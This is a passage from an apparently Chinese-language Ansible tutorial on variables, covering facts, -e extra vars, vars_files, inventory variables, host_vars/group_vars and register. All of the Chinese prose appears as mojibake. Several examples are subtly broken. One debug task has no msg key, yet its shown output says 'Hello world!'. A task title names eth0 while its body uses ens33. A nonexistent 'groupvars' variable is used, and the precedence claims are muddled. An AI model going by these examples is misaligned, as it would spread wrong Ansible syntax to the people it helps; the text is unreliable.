ç›®å½•ï¼Œåœ¨å…¶ä¸­æ–°å»º YAML æ–‡ä»¶å®šä¹‰å˜é‡\nåœ¨ role ï¼ˆè§’è‰²ï¼‰ä¸­å®šä¹‰\nåœ¨ Ansible è§’è‰²ä¸­ï¼Œå˜é‡ä¹Ÿæœ‰ä¼˜å…ˆçº§ï¼Œç±»ä¼¼äº Ansible çš„å…¶ä»–å˜é‡ã€‚è§’è‰²å†…çš„å˜é‡å¯ä»¥åˆ†ä¸ºå‡ ä¸ªä¸åŒçš„çº§åˆ«ï¼Œä¼˜å…ˆçº§ä»é«˜åˆ°ä½æ’åˆ—å¦‚ä¸‹ï¼š\nè§’è‰²ä»»åŠ¡å˜é‡ï¼ˆRole Task Variablesï¼‰ï¼šè¿™äº›å˜é‡åœ¨è§’è‰²å†…çš„ä»»åŠ¡ä¸­å®šä¹‰ï¼Œå¹¶ä¸”åªåœ¨ç‰¹å®šä»»åŠ¡ä¸­ç”Ÿæ•ˆã€‚è¿™äº›å˜é‡çš„ä¼˜å…ˆçº§æœ€é«˜ï¼Œä¼šè¦†ç›–å…¶ä»–çº§åˆ«çš„å˜é‡ã€‚\nåœ¨è§’è‰²ä»»åŠ¡ä¸­å®šä¹‰çš„å˜é‡ï¼Œé€šå¸¸å­˜å‚¨åœ¨ä»»åŠ¡ä¸­çš„ vars éƒ¨åˆ†ï¼š\n- name: Example role task debug: msg: \u0026#34;This is a task with a role-level variable\u0026#34; vars: task_variable: value è§’è‰²é»˜è®¤å˜é‡ï¼ˆRole Default Variablesï¼‰ï¼šè§’è‰²çš„é»˜è®¤å˜é‡å­˜å‚¨åœ¨è§’è‰²çš„ defaults ç›®å½•ä¸‹ã€‚è¿™äº›å˜é‡åœ¨è§’è‰²å†…éƒ¨è¢«è®¤ä¸ºæ˜¯é»˜è®¤è®¾ç½®ï¼Œé™¤éè¢«å…¶ä»–çº§åˆ«çš„å˜é‡è¦†ç›–ã€‚\nè§’è‰²é»˜è®¤å˜é‡å­˜å‚¨åœ¨ roles/role_name/defaults/main.yml æ–‡ä»¶ä¸­ã€‚\nè§’è‰²å˜é‡ï¼ˆRole Variablesï¼‰ï¼šåœ¨ä½¿ç”¨è§’è‰²æ—¶ï¼Œå¯ä»¥åœ¨ä¸»å‰§æœ¬ä¸­ä¸ºè§’è‰²è®¾ç½®å˜é‡ã€‚è¿™äº›å˜é‡å¯ä»¥å½±å“è§’è‰²ä¸­çš„ä»»åŠ¡å’Œé»˜è®¤å˜é‡ã€‚\nåœ¨ä¸»å‰§æœ¬ä¸­ä¸ºè§’è‰²è®¾ç½®å˜é‡çš„æ–¹å¼å¦‚ä¸‹ï¼š\n- name: Playbook using a role hosts: target_hosts roles: - role: role_name vars: role_var: value ä¸»æœºæ¸…å•ä¸­çš„å˜é‡ï¼ˆInventory Variablesï¼‰ï¼šåœ¨ä¸»æœºæ¸…å•ä¸­ä¸ºä¸»æœºæˆ–ä¸»æœºç»„å®šä¹‰çš„å˜é‡ã€‚è¿™äº›å˜é‡åœ¨è§’è‰²å†…ä¹Ÿå¯ä»¥ä½¿ç”¨ï¼Œä½†æ˜¯å…¶ä¼˜å…ˆçº§è¾ƒä½ã€‚\nåœ¨ä¸»æœºæ¸…å•ä¸­ä¸ºä¸»æœºå®šä¹‰å˜é‡çš„æ–¹å¼å¦‚ä¸‹ï¼š\n[target_hosts] host1 ansible_ssh_host=192.168.1.1 role_var=value å˜é‡ä¼˜å…ˆçº§ä»é«˜åˆ°ä½å¦‚ä¸‹ï¼š\n1. å‘½ä»¤è¡Œ -e ä¼ é€’çš„å˜é‡ 2. playbook ä¸­ 2.1 vars_files å¼•å…¥çš„å˜é‡ 2.1 playbook ä¸­ vars å˜é‡å®šä¹‰ 3. host_vars/ä¸»æœºåæ–‡ä»¶ 4. ä¸»æœºæ¸…å•ä¸­çš„ä¸»æœºå˜é‡ 5. group_vars 5.1 ä¸»æœºç»„åæ–‡ä»¶ 5.2 all.yml 6. ä¸»æœºæ¸…å•ä¸­çš„ç»„å˜é‡ æ€»çš„æ¥è¯´ï¼Œå˜é‡å®šä¹‰æ–¹å¼å¤šè€Œæ‚ï¼Œå®é™…ä½¿ç”¨æ—¶åº”é¿å…åœ¨å¤šä¸ªåœ°æ–¹å®šä¹‰åŒä¸€ä¸ªå˜é‡ï¼Œé™ä½å¤æ‚åº¦ï¼Œä»è€Œé™ä½ç»´æŠ¤æˆæœ¬ï¼Œå‡å°‘å‡ºé”™çš„å¯èƒ½æ€§ã€‚\n3.7.1 ä½¿ç”¨ setup æ¨¡å—ä¸­çš„å˜é‡ 3.7.1.1 ä½¿ç”¨ facts å˜é‡ æœ¬æ¨¡å—è‡ªåŠ¨åœ¨playbookè°ƒç”¨ï¼Œç”Ÿæˆçš„ç³»ç»ŸçŠ¶æ€ä¿¡æ¯, å¹¶å°†ä¹‹å­˜æ”¾åœ¨factså˜é‡ä¸­\nfacts åŒ…æ‹¬çš„ä¿¡æ¯å¾ˆå¤š,å¦‚: ä¸»æœºå, IP, CPU, å†…å­˜, ç½‘å¡ç­‰\nfacts å˜é‡çš„å®é™…ä½¿ç”¨åœºæ™¯æ¡ˆä¾‹\né€šè¿‡factså˜é‡è·å–è¢«æ§ç«¯CPUçš„ä¸ªæ•°ä¿¡æ¯ï¼Œä»è€Œç”Ÿæˆä¸åŒçš„Nginxé…ç½®æ–‡ä»¶\né€šè¿‡factså˜é‡è·å–è¢«æ§ç«¯å†…å­˜å¤§å°ä¿¡æ¯ï¼Œä»è€Œç”Ÿæˆä¸åŒçš„memcachedçš„é…ç½®æ–‡ä»¶\né€šè¿‡factså˜é‡è·å–è¢«æ§ç«¯ä¸»æœºåç§°ä¿¡æ¯ï¼Œä»è€Œç”Ÿæˆä¸åŒçš„Zabbixé…ç½®æ–‡ä»¶\né€šè¿‡factså˜é‡è·å–è¢«æ§ç«¯ç½‘å¡ä¿¡æ¯ï¼Œä»è€Œç”Ÿæˆä¸åŒçš„ä¸»æœºå\n\u0026hellip;\u0026hellip;\nèŒƒä¾‹ï¼š\n# è·å–ç½‘å¡ä¿¡æ¯ [root@ansible playbooks]# ansible localhost -m setup -a \u0026#39;filter=\u0026#34;ansible_default_ipv4\u0026#34;\u0026#39; localhost | SUCCESS =\u0026gt; { \u0026#34;ansible_facts\u0026#34;: { \u0026#34;ansible_default_ipv4\u0026#34;: { \u0026#34;address\u0026#34;: \u0026#34;192.168.146.128\u0026#34;, \u0026#34;alias\u0026#34;: \u0026#34;ens33\u0026#34;, \u0026#34;broadcast\u0026#34;: \u0026#34;192.168.146.255\u0026#34;, \u0026#34;gateway\u0026#34;: \u0026#34;192.168.146.254\u0026#34;, \u0026#34;interface\u0026#34;: \u0026#34;ens33\u0026#34;, \u0026#34;macaddress\u0026#34;: \u0026#34;00:0c:29:c6:1a:98\u0026#34;, \u0026#34;mtu\u0026#34;: 1500, \u0026#34;netmask\u0026#34;: \u0026#34;255.255.255.0\u0026#34;, \u0026#34;network\u0026#34;: \u0026#34;192.168.146.0\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;ether\u0026#34; } }, \u0026#34;changed\u0026#34;: false } # æŸ¥çœ‹ä¸»æœºå [root@ansible playbooks]# ansible localhost -m setup -a \u0026#39;filter=\u0026#34;ansible_nodename\u0026#34;\u0026#39; localhost | SUCCESS =\u0026gt; { \u0026#34;ansible_facts\u0026#34;: { \u0026#34;ansible_nodename\u0026#34;: \u0026#34;ansible\u0026#34; }, \u0026#34;changed\u0026#34;: false } # æ ¹æ®ä¸»æœºåç”Ÿæˆæ—¥å¿—æ–‡ä»¶ [root@ansible playbooks]# vim touch_host_log.yaml [root@ansible playbooks]# ansible-playbook touch_host_log.yaml [root@ansible playbooks]# ansible remote -a \u0026#39;ls /tmp/remote.log\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; /tmp/remote.log # è·å–ç½‘å¡åœ°å€ [root@ansible playbooks]# cat show_ip_of_eth0.yaml --- - hosts: remote tasks: - name: show ens33 ip address of {{ ansible_facts[\u0026#34;eth0\u0026#34;][\u0026#34;ipv4\u0026#34;][\u0026#34;address\u0026#34;] }} debug: msg: Ip address {{ ansible_facts.ens33.ipv4.address }} - name: another way debug: Ip address {{ ansible_facts[\u0026#34;ens33\u0026#34;][\u0026#34;ipv4\u0026#34;][\u0026#34;address\u0026#34;] }} [root@ansible playbooks]# ansible-playbook show_ip_of_eth0.yaml PLAY [remote] ****************************************************************** TASK [Gathering Facts] ********************************************************* ok: [remote] TASK [show ens33 ip address of {{ ansible_facts[\u0026#34;eth0\u0026#34;][\u0026#34;ipv4\u0026#34;][\u0026#34;address\u0026#34;] }}] *** ok: [remote] =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;Ip address 192.168.146.129\u0026#34; } TASK [another way] ************************************************************* ok: [remote] =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;Hello world!\u0026#34; } PLAY RECAP ********************************************************************* remote : ok=3 changed=0 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 3.7.1.2 æ€§èƒ½ä¼˜åŒ– æ‰§è¡Œ playbook æ—¶ï¼Œé»˜è®¤å¯ç”¨ setup æ¨¡å—æ”¶é›†ç›®æ ‡ä¸»æœºçš„ facts å˜é‡ï¼Œä¼šè€—è´¹ä¸€å®šæ—¶é—´ã€‚å¯é€‰åˆ™ä»¥ä¸‹ä¸¤ç§æ–¹å¼è¿›è¡Œé…ç½®\nå¦‚æœä¸éœ€è¦ä½¿ç”¨åˆ°ç›®æ ‡ä¸»æœºçš„å˜é‡ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡ gather_facts: no é€‰é¡¹æ¥å…³é—­æ­¤è¡Œä¸º\n--- - hosts: all gather_facts: no åœ¨ Ansible ä¸­ï¼Œ\u0026ldquo;facts ç¼“å­˜\u0026rdquo; æ˜¯æŒ‡å°†ä¸»æœºçš„äº‹å®æ•°æ®ï¼ˆä¾‹å¦‚ä¸»æœºåã€æ“ä½œç³»ç»Ÿä¿¡æ¯ã€IP åœ°å€ç­‰ï¼‰ç¼“å­˜èµ·æ¥ï¼Œä»¥ä¾¿åœ¨åç»­çš„ Ansible è¿è¡Œä¸­é‡ç”¨è¿™äº›æ•°æ®ï¼Œä»è€Œå‡å°‘ç³»ç»Ÿèµ„æºçš„ä½¿ç”¨å’Œæé«˜æ‰§è¡Œæ•ˆç‡ã€‚\nè¦å¯ç”¨ Ansible çš„ Facts ç¼“å­˜åŠŸèƒ½ï¼Œä½ å¯ä»¥åœ¨ Ansible é…ç½®æ–‡ä»¶ä¸­è¿›è¡Œè®¾ç½®ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒAnsible å°†äº‹å®æ•°æ®å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œä½†ä½ ä¹Ÿå¯ä»¥é€‰æ‹©å°†å…¶å­˜å‚¨åœ¨ç£ç›˜ä¸Šä»¥å®ç°æŒä¹…æ€§ã€‚\nä»¥ä¸‹æ˜¯å¯ç”¨ Ansible Facts ç¼“å­˜çš„é…ç½®ç¤ºä¾‹ï¼š\nå­˜å‚¨åœ¨å†…å­˜ä¸­ï¼š åœ¨ Ansible é…ç½®æ–‡ä»¶ä¸­ï¼ˆé€šå¸¸æ˜¯ /etc/ansible/ansible.cfg æˆ– ~/.ansible.cfgï¼‰ï¼Œæ·»åŠ ä»¥ä¸‹é…ç½®è¡Œï¼š\n[defaults] gathering = smart fact_caching = memory å­˜å‚¨åœ¨ç£ç›˜ä¸Šï¼š è¦å°† Facts å­˜å‚¨åœ¨ç£ç›˜ä¸Šï¼Œä½ éœ€è¦é€‰æ‹©ä¸€ä¸ªç›®å½•æ¥ä¿å­˜ç¼“å­˜æ•°æ®ã€‚åœ¨ Ansible é…ç½®æ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹é…ç½®è¡Œï¼š\n[defaults] gathering = smart fact_caching = jsonfile fact_caching_connection = /path/to/cache_directory å°† /path/to/cache_directory æ›¿æ¢ä¸ºä½ æƒ³è¦å­˜å‚¨ Facts ç¼“å­˜æ•°æ®çš„å®é™…ç›®å½•è·¯å¾„ã€‚\nå®Œæˆé…ç½®åï¼Œé‡æ–°è¿è¡Œ Ansible å‘½ä»¤ï¼Œå®ƒå°†ä½¿ç”¨ Facts ç¼“å­˜æ¥åŠ é€Ÿæ‰§è¡Œè¿‡ç¨‹ã€‚\nè¯·æ³¨æ„ï¼Œä»¥ä¸Šé…ç½®ç¤ºä¾‹é€‚ç”¨äº Ansible ç‰ˆæœ¬è¾ƒæ–°çš„æƒ…å†µã€‚åœ¨ç‰¹å®šçš„ Ansible ç‰ˆæœ¬ä¸­ï¼Œé…ç½®é€‰é¡¹å¯èƒ½ä¼šæœ‰æ‰€ä¸åŒã€‚åœ¨ä½¿ç”¨å‰ï¼Œè¯·ç¡®ä¿æŸ¥é˜…ä¸ä½ æ‰€ä½¿ç”¨çš„ Ansible ç‰ˆæœ¬ç›¸åŒ¹é…çš„å®˜æ–¹æ–‡æ¡£æˆ–æ‰‹å†Œã€‚\n3.7.2 å‘½ä»¤è¡Œä¸­ç»™ playbook ä¼ é€’å˜é‡ åœ¨ Ansible çš„ ansible-playbook å‘½ä»¤è¡Œä¸­ï¼Œå¯ä»¥ä½¿ç”¨ -e é€‰é¡¹æ¥ä¼ é€’é¢å¤–çš„å˜é‡ç»™ playbookã€‚è¿™å¯ä»¥è®©ä½ åœ¨è¿è¡Œ playbook æ—¶åŠ¨æ€åœ°æŒ‡å®šå˜é‡çš„å€¼ï¼Œè€Œä¸å¿…ä¿®æ”¹ playbook æ–‡ä»¶æœ¬èº«ã€‚ä»¥ä¸‹æ˜¯ä¼ é€’å˜é‡çš„å‡ ç§æ–¹å¼ï¼š\nä¼ é€’å•ä¸ªå˜é‡ï¼š\nansible-playbook -e \u0026#34;variable_name=variable_value\u0026#34; playbook.yml ä¼ é€’å¤šä¸ªå˜é‡ï¼š\nå¦‚æœä½ æƒ³ä¼ é€’å¤šä¸ªå˜é‡ï¼Œå¯ä»¥ä½¿ç”¨å¤šä¸ª -e é€‰é¡¹æˆ–è€…å°†å¤šä¸ªå˜é‡æ”¾åœ¨ä¸€ä¸ªå¼•å·ä¸­ï¼Œç”¨ç©ºæ ¼æˆ–é€—å·åˆ†éš”ã€‚\nansible-playbook -e \u0026#34;variable1=value1 variable2=value2\u0026#34; playbook.yml æˆ–è€…ï¼š\nansible-playbook -e \u0026#34;variable1=value1\u0026#34; -e \u0026#34;variable2=value2\u0026#34; playbook.yml ä¼ é€’ yaml å˜é‡æ–‡ä»¶\nå‡è®¾ä½ çš„ YAML æ–‡ä»¶ vars.yml å¦‚ä¸‹ï¼š\n#vars.yml my_variable: \u0026#34;Hello, Ansible!\u0026#34; database_host: \u0026#34;db.example.com\u0026#34; database_port: 3306 é€šè¿‡ -e é€‰é¡¹ä¼ é€’æ­¤æ–‡ä»¶ä¸­çš„å˜é‡\nansible-playbook -e @vars.yaml playbook.yml ä¼ é€’ JSON æ–‡ä»¶ï¼š\nä½ ä¹Ÿå¯ä»¥å°†å˜é‡ä¿å­˜åœ¨ä¸€ä¸ª JSON æ ¼å¼çš„æ–‡ä»¶ä¸­ï¼Œç„¶åä½¿ç”¨ -e é€‰é¡¹ä¼ é€’æ–‡ä»¶è·¯å¾„ã€‚\nansible-playbook -e @variables.json playbook.yml å…¶ä¸­ï¼Œvariables.json æ˜¯ä¸€ä¸ªåŒ…å«å˜é‡çš„ JSON æ–‡ä»¶ã€‚\næ— è®ºä½ é€‰æ‹©å“ªç§æ–¹å¼ï¼Œä¼ é€’çš„å˜é‡éƒ½å¯ä»¥åœ¨ playbook ä¸­ä½¿ç”¨ï¼Œä¾‹å¦‚ï¼š\n[root@ansible playbooks]# cat playbook.yml --- - name: Example Playbook gather_facts: no hosts: remote tasks: - debug: var: my_variable [root@ansible playbooks]# ansible-playbook -e @vars.yaml playbook.yml PLAY [Example Playbook] ******************************************************** TASK [debug] ******************************************************************* ok: [remote] =\u0026gt; { \u0026#34;my_variable\u0026#34;: \u0026#34;Hello, Ansible!\u0026#34; } PLAY RECAP ********************************************************************* remote : ok=1 changed=0 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œmy_variable å˜é‡çš„å€¼å°†æ ¹æ®åœ¨å‘½ä»¤è¡Œä¸­ä¼ é€’çš„å€¼è¿›è¡Œè®¾å®šã€‚\n3.7.3 åœ¨ playbook æ–‡ä»¶ä¸­å®šä¹‰å˜é‡ åœ¨Playbookçº§åˆ«å®šä¹‰å˜é‡ï¼š\nåœ¨Playbookä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨varså…³é”®å­—æ¥å®šä¹‰å˜é‡ã€‚è¿™äº›å˜é‡å°†åœ¨æ•´ä¸ªPlaybookä¸­å¯ç”¨ã€‚\n--- - name: Example Playbook hosts: my_hosts vars: variable_name: variable_value tasks: - name: Task using variable debug: var: variable_name å˜é‡ä¹‹é—´ç›¸äº’å¼•ç”¨:\n--- - name: Example Playbook hosts: localhost vars: remote_ip: \u0026#34;{{ ansible_default_ipv4.address }}\u0026#34; tasks: - name: Task using variable debug: var: remote_ip 3.7.4 åœ¨å¤–éƒ¨å˜é‡æ–‡ä»¶ä¸­å®šä¹‰å˜é‡ï¼š vars_files ä¸­çš„æ–‡ä»¶è·¯å¾„æ˜¯ç›¸å¯¹äºå½“å‰å·¥ä½œç›®å½•çš„ã€‚å¦‚æœå˜é‡æ–‡ä»¶ä½äº Playbook æ–‡ä»¶çš„åŒä¸€ç›®å½•ä¸­ï¼Œä½ å¯ä»¥ç›´æ¥æä¾›æ–‡ä»¶åï¼Œå¦‚ vars_files: vars.ymlã€‚å¦‚æœåœ¨å…¶ä»–ç›®å½•ä¸­ï¼Œå°±éœ€è¦æä¾›å®Œæ•´çš„ç›¸å¯¹æˆ–ç»å¯¹è·¯å¾„ã€‚\nå°†å˜é‡å­˜å‚¨åœ¨å¤–éƒ¨æ–‡ä»¶ä¸­ï¼Œç„¶ååœ¨Playbookä¸­å¯¼å…¥è¿™äº›å˜é‡ã€‚è¿™åœ¨éœ€è¦å…±äº«å˜é‡çš„å¤šä¸ªPlaybookä¹‹é—´å¾ˆæœ‰ç”¨ã€‚\n--- - name: Example Playbook hosts: my_hosts vars_files: - vars.yml tasks: - name: Task using variable debug: var: variable_name å¤–éƒ¨å˜é‡æ–‡ä»¶ vars.yml çš„å†…å®¹ï¼š\nvariable_name: variable_value 3.7.5 åœ¨ä¸»æœºæ¸…å•ä¸­å®šä¹‰å˜é‡ åœ¨Ansibleä¸­ï¼Œä½ å¯ä»¥ä¸ºä¸»æœºå’Œä¸»æœºç»„å®šä¹‰å˜é‡ï¼Œä»¥ä¾¿åœ¨Playbooksä¸­ä½¿ç”¨è¿™äº›å˜é‡æ¥æ§åˆ¶ä»»åŠ¡çš„è¡Œä¸ºã€‚è¿™æœ‰åŠ©äºå®ç°æ›´çµæ´»çš„é…ç½®å’ŒåŠ¨æ€æ€§ã€‚ä¸‹é¢æ˜¯å…³äºå¦‚ä½•åœ¨Ansibleä¸­ä¸ºä¸»æœºå’Œä¸»æœºç»„å®šä¹‰å˜é‡çš„è¯¦ç»†ä¿¡æ¯ï¼š\nä¸»æœºå˜é‡ï¼š\nä½ å¯ä»¥ä¸ºæ¯ä¸ªå…·ä½“çš„ä¸»æœºå®šä¹‰å˜é‡ï¼Œè¿™äº›å˜é‡åªé€‚ç”¨äºè¯¥ä¸»æœºã€‚åœ¨Ansibleçš„Inventoryæ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯INIæ ¼å¼æˆ–YAMLæ ¼å¼ï¼‰ä¸­ï¼Œä½ å¯ä»¥åƒè¿™æ ·ä¸ºä¸»æœºå®šä¹‰å˜é‡ï¼š\nINIæ ¼å¼ï¼š\n[my_hosts] host1 ansible_ssh_host=192.168.1.1 [my_hosts:vars] some_variable=some_value YAMLæ ¼å¼ï¼š\nmy_hosts: hosts: host1: ansible_ssh_host: 192.168.1.1 vars: some_variable: some_value ä¸»æœºç»„å˜é‡ï¼š\nä½ å¯ä»¥ä¸ºä¸»æœºç»„å®šä¹‰å˜é‡ï¼Œè¿™äº›å˜é‡å°†åº”ç”¨äºè¯¥ä¸»æœºç»„ä¸­çš„æ‰€æœ‰ä¸»æœºã€‚åŒæ ·ï¼Œåœ¨Inventoryæ–‡ä»¶ä¸­ï¼Œä½ å¯ä»¥ä¸ºä¸»æœºç»„å®šä¹‰å˜é‡ï¼š\nINIæ ¼å¼ï¼š\n[my_hosts] host1 ansible_ssh_host=192.168.1.1 host2 ansible_ssh_host=192.168.1.2 [my_hosts:vars] some_variable=some_value YAMLæ ¼å¼ï¼š\nmy_hosts: hosts: host1: ansible_ssh_host: 192.168.1.1 host2: ansible_ssh_host: 192.168.1.2 vars: some_variable: some_value ä½¿ç”¨å˜é‡ï¼š\nåœ¨Playbookä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨å®šä¹‰çš„ä¸»æœºå˜é‡å’Œä¸»æœºç»„å˜é‡ã€‚ä¾‹å¦‚ï¼š\n--- - name: Example Playbook hosts: my_hosts tasks: - name: Task using host variable debug: var: hostvars[inventory_hostname][\u0026#39;some_variable\u0026#39;] - name: Task using host group variable debug: var: groupvars[\u0026#39;my_hosts\u0026#39;][\u0026#39;some_variable\u0026#39;] - name: normal use debug: var: some_variable ä¸Šè¿°ä»£ç ä¸­ï¼Œhostvars[inventory_hostname]['some_variable'] ç”¨äºè®¿é—®ç‰¹å®šä¸»æœºçš„å˜é‡ï¼Œè€Œ groupvars['my_hosts']['some_variable'] ç”¨äºè®¿é—®ä¸»æœºç»„çš„å˜é‡ã€‚\né€šè¿‡è¿™äº›æ–¹æ³•ï¼Œä½ å¯ä»¥åœ¨Ansibleä¸­ä¸ºä¸»æœºå’Œä¸»æœºç»„å®šä¹‰å˜é‡ï¼Œä»è€Œå®ç°æ›´åŠ åŠ¨æ€å’Œå¯é…ç½®çš„Playbooksã€‚\n3.7.6 host_vars å’Œ group_vars åœ¨ Ansible ä¸­ï¼Œhost_vars å’Œ group_vars æ˜¯ç”¨äºç®¡ç†ä¸»æœºå’Œä¸»æœºç»„å˜é‡çš„ç‰¹æ®Šç›®å½•ã€‚è¿™äº›ç›®å½•å…è®¸ä½ åœ¨ä¸åŒçš„çº§åˆ«ä¸ºä¸»æœºå’Œä¸»æœºç»„å®šä¹‰å˜é‡ï¼Œä»¥ä¾¿åœ¨ä½ çš„ Ansible ä»»åŠ¡ä¸­ä½¿ç”¨ã€‚è¿™æ ·ï¼Œä½ å¯ä»¥æ ¹æ®éœ€è¦ä¸ºä¸åŒçš„ä¸»æœºæˆ–ä¸»æœºç»„é…ç½®ç‰¹å®šçš„å˜é‡å€¼ï¼Œè€Œä¸å¿…åœ¨æ¯ä¸ªä»»åŠ¡ä¸­éƒ½æ‰‹åŠ¨æŒ‡å®šè¿™äº›å€¼ã€‚\nä»¥ä¸‹æ˜¯å…³äº host_vars å’Œ group_vars çš„æ›´è¯¦ç»†ä»‹ç»å’Œä½¿ç”¨æ–¹æ³•ï¼š\n1. host_varsï¼š host_vars ç›®å½•ç”¨äºä¸ºå•ä¸ªä¸»æœºå®šä¹‰å˜é‡ã€‚åœ¨è¿™ä¸ªç›®å½•ä¸‹ï¼Œä½ å¯ä»¥ä¸ºæ¯ä¸ªä¸»æœºåˆ›å»ºä¸€ä¸ªå•ç‹¬çš„ YAML æ–‡ä»¶ï¼Œæ–‡ä»¶åä¸ä¸»æœºçš„åç§°åŒ¹é…ã€‚è¿™äº›å˜é‡å°†ä»…åº”ç”¨äºç‰¹å®šçš„ä¸»æœºã€‚\nç›®å½•ç»“æ„ç¤ºä¾‹ï¼š\n. â”œâ”€â”€ inventory.ini â”œâ”€â”€ host_vars â”‚ â”œâ”€â”€ server1.yml â”‚ â”œâ”€â”€ server2.yml â”‚ â””â”€â”€ ... â””â”€â”€ group_vars â”œâ”€â”€ group1.yml â”œâ”€â”€ group2.yml â””â”€â”€ ... 2. group_varsï¼š group_vars ç›®å½•ç”¨äºä¸ºä¸»æœºç»„å®šä¹‰å˜é‡ã€‚ä¸»æœºç»„æ˜¯åœ¨ Ansible ä¸»æœºæ¸…å•æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯ inventory.iniï¼‰ä¸­å®šä¹‰çš„ã€‚ä½ å¯ä»¥ä¸ºæ¯ä¸ªä¸»æœºç»„åˆ›å»ºä¸€ä¸ªå•ç‹¬çš„ YAML æ–‡ä»¶ï¼Œæ–‡ä»¶åä¸ä¸»æœºç»„çš„åç§°åŒ¹é…ã€‚è¿™äº›å˜é‡å°†åº”ç”¨äºä¸»æœºç»„ä¸­çš„æ‰€æœ‰ä¸»æœºã€‚\nä½¿ç”¨æ–¹æ³•ï¼š\nåœ¨ä½ çš„ Ansible é¡¹ç›®ç›®å½•ä¸­åˆ›å»º host_vars å’Œ group_vars ç›®å½•ã€‚\nåœ¨ host_vars ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªæˆ–å¤šä¸ª YAML æ–‡ä»¶ï¼Œæ¯ä¸ªæ–‡ä»¶å¯¹åº”ä¸€ä¸ªä¸»æœºï¼Œå¹¶åœ¨å…¶ä¸­å®šä¹‰ä½ å¸Œæœ›åœ¨è¿™äº›ä¸»æœºä¸Šä½¿ç”¨çš„å˜é‡ã€‚\nåœ¨ group_vars ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªæˆ–å¤šä¸ª YAML æ–‡ä»¶ï¼Œæ¯ä¸ªæ–‡ä»¶å¯¹åº”ä¸€ä¸ªä¸»æœºç»„ï¼Œå¹¶åœ¨å…¶ä¸­å®šä¹‰ä½ å¸Œæœ›åœ¨è¿™äº›ä¸»æœºç»„ä¸Šä½¿ç”¨çš„å˜é‡ã€‚\nåœ¨ Ansible ä¸»æœºæ¸…å•æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯ inventory.iniï¼‰ä¸­ï¼Œå°†ä¸»æœºåˆ†é…ç»™ç›¸åº”çš„ä¸»æœºç»„ã€‚\nåœ¨ä½ çš„ Ansible ä»»åŠ¡ä¸­ï¼Œä½ å¯ä»¥ç›´æ¥ä½¿ç”¨è¿™äº›å˜é‡ï¼ŒAnsible ä¼šè‡ªåŠ¨åŠ è½½å®ƒä»¬ã€‚\nç¤ºä¾‹ï¼š\nå‡è®¾ä½ æœ‰ä¸¤å°ä¸»æœºï¼šwebserver1 å’Œ webserver2ï¼Œä½ è¿˜æœ‰ä¸€ä¸ªä¸»æœºç»„ï¼šwebserversã€‚ä½ æƒ³è¦ä¸ºæ¯ä¸ªä¸»æœºå’Œä¸»æœºç»„å®šä¹‰ä¸€äº›å˜é‡ã€‚\nhost_vars/webserver1.yml:\n# host_vars/webserver1.yml app_port: 8080 app_env: production host_vars/webserver2.yml:\n# host_vars/webserver2.yml app_port: 8000 app_env: staging group_vars/webservers.yml:\n# group_vars/webservers.yml app_user: webuser app_path: /var/www/app inventory.ini:\n[webservers] webserver1 webserver2 playbook.yml:\n--- - name: Configure web servers hosts: webservers tasks: - name: Display app settings debug: msg: \u0026#34;App running on port {{ app_port }} with environment {{ app_env }}. User: {{ app_user }} Path: {{ app_path }}\u0026#34; åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œwebserver1 å’Œ webserver2 åˆ†åˆ«æœ‰å„è‡ªçš„å˜é‡ï¼Œè€Œ webservers ä¸»æœºç»„å…±äº«äº†ç›¸åŒçš„å˜é‡ã€‚åœ¨ä»»åŠ¡ä¸­ï¼Œä½ å¯ä»¥ç›´æ¥ä½¿ç”¨è¿™äº›å˜é‡ï¼ŒAnsible ä¼šå°†å®ƒä»¬ä¸ç›¸åº”çš„ä¸»æœºæˆ–ä¸»æœºç»„å…³è”èµ·æ¥ã€‚\nä½¿ç”¨ host_vars å’Œ group_vars å¯ä»¥ä½¿ä½ çš„ Ansible é¡¹ç›®æ›´æœ‰ç»“æ„ï¼Œæ›´æ˜“äºç»´æŠ¤ï¼Œå› ä¸ºä½ å¯ä»¥å°†å˜é‡ä¸ä¸»æœºå’Œä¸»æœºç»„å…³è”èµ·æ¥ï¼Œè€Œä¸å¿…åœ¨æ¯ä¸ªä»»åŠ¡ä¸­éƒ½é‡å¤å®šä¹‰ã€‚\n3.7.7 register åœ¨ Ansible ä¸­ï¼Œregister æ˜¯ä¸€ä¸ªç”¨äºæ•è·ä»»åŠ¡æ‰§è¡Œç»“æœçš„å…³é”®å­—ã€‚é€šè¿‡ä½¿ç”¨ registerï¼Œä½ å¯ä»¥å°†ä»»åŠ¡çš„è¾“å‡ºã€è¿”å›å€¼æˆ–å…¶ä»–ä¿¡æ¯ä¿å­˜åˆ°ä¸€ä¸ªå˜é‡ä¸­ï¼Œä»¥ä¾¿åç»­ä»»åŠ¡å¯ä»¥ä½¿ç”¨è¿™äº›ä¿¡æ¯ã€‚è¿™åœ¨å¤„ç†ä»»åŠ¡çš„è¾“å‡ºã€é”™è¯¯å¤„ç†å’Œæ¡ä»¶æ‰§è¡Œæ–¹é¢éå¸¸æœ‰ç”¨ã€‚\nä½¿ç”¨æ–¹æ³•ï¼š\nåœ¨ Ansible playbook çš„ä»»åŠ¡ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ register æ¥æ•è·ä»»åŠ¡çš„è¾“å‡ºã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªåŸºæœ¬çš„ç”¨æ³•ç¤ºä¾‹ï¼š\n--- - name: Execute a command hosts: myhosts tasks: - name: Run a command and capture the output command: echo \u0026#34;Hello, Ansible!\u0026#34; register: command_output - name: Display the captured output debug: var: command_output.stdout 